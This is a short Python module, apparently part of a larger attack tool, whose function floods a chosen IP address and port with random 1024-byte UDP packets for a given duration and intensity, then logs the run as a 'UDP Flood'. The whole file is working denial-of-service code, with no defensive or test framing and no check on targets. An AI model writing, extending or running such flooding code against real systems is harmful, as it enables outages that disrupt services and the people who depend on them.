import socket
import random
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            sock.sendto(random._urandom(1024), (target_ip, target_port))

    log_attack("UDP Flood", target_ip, target_port, duration, intensity)

